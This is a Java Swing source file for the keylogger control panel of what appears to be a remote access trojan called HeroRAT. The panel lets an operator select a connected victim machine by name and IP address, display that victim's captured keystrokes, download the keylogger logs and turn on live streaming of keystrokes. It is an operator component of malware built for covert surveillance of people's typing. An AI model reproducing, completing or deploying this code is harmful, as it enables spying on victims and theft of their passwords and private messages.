package net.herorat.gui;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.BorderFactory;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;

import net.herorat.Main;
import net.herorat.features.keylogger.Keylogger;
import net.herorat.features.servers.Server;
import net.herorat.network.Network;


public class PanelKeylogger extends JPanel
{	
	private static final long serialVersionUID = -3873818066335138946L;
	
	private JLabel label_select;
	private JButton button_start;
	private boolean running;
	private Server server;
	
	private JScrollPane scroll_output;
	public JTextArea area_output;
	
	private JPanel panel_bottom;
	private JButton button_download;
	private JCheckBox box_live;

	public PanelKeylogger()
	{
		initComponents();
		display();
	}
	
	private void initComponents()
	{
		setLayout(new BorderLayout(5, 0));
		createSelect();
		createOutput();
		createPanel();
	}
	
	private void display()
	{
		setVisible(true);
	}
	
	private void createSelect()
	{
		label_select = new JLabel("Select a user from the tree list.");
		button_start = new JButton("Start service");
		button_start.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				if(running){
					stopService();
				}else{
					startService();
				}
			}
		});
		
		JPanel top_panel = new JPanel();
		top_panel.setLayout(new BorderLayout(5, 0));
		top_panel.setBorder(BorderFactory.createEmptyBorder(0, 2, 5, 2));
		top_panel.add(label_select, BorderLayout.LINE_START);
		top_panel.add(button_start, BorderLayout.LINE_END);
		add(top_panel, BorderLayout.NORTH);

	}

	public Server getCurrentServer(){
		return server;
	}

	private void startService(){
		server = Main.mainWindow.ServerStatusTree.getSelectedServer();
		if (server != null)
		{
			running = true;
			button_start.setText("Stop service");
			label_select.setText("Talking to: "+server.getServerName()+"@"+server.getIp());
			area_output.setText("Loading ...");
			area_output.setText(server.buffer_logger.toString());
			button_download.setEnabled(true);
			box_live.setEnabled(true);
		}else{
			stopService();
		}
	}

	private void stopService(){
		server = null;
		running = false;
		area_output.setText("");
		button_start.setText("Start service");
		label_select.setText("Select a user from the tree list.");
		button_download.setEnabled(false);
		box_live.setEnabled(false);
	}

	private void createOutput()
	{
		scroll_output = new JScrollPane();
		area_output = new JTextArea();
		area_output.setColumns(55);
		area_output.setRows(22);
		area_output.setEditable(false);
		area_output.setLineWrap(true);
		scroll_output.setViewportView(area_output);
		add(scroll_output, BorderLayout.CENTER);
	}
	
	private void createPanel()
	{
		panel_bottom = new JPanel();
		panel_bottom.setLayout(new BorderLayout(5, 0));
		panel_bottom.setBorder(BorderFactory.createEmptyBorder(0, 2, 0, 2));
		
		button_download = new JButton("Download logs");
		button_download.setPreferredSize(new Dimension(300, 25));
		button_download.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				if (server != null) Keylogger.sendDownload(server);
			}
		});
		
		box_live = new JCheckBox("Live stream");
		box_live.setPreferredSize(new Dimension(100, 25));
		box_live.addChangeListener(new ChangeListener() {
			public void stateChanged(ChangeEvent evt)
			{
				if (server != null) Keylogger.sendLive(server, box_live.isSelected());
			}
		});
		
		panel_bottom.add(button_download, BorderLayout.LINE_START);
		panel_bottom.add(box_live, BorderLayout.LINE_END);
		add(panel_bottom, BorderLayout.SOUTH);
		
		button_download.setEnabled(false);
		box_live.setEnabled(false);
	}
}